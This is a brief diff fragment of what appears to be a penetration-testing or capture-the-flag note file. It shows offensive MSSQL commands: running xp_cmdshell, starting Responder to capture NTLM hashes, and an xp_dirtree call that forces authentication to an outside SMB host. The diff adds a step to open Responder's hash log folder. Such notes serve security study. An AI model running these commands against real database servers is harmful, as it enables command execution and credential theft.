@@ -335,7 +335,8 @@ RECONFIGURE;
 EXECUTE xp_cmdshell 'whoami';
 
 # NTLM
-responder -I tun0
+responder -I tun0 
+cd /usr/share/responder/logs
 
 xp_dirtree '\\10.10.14.23\any\thing'
 
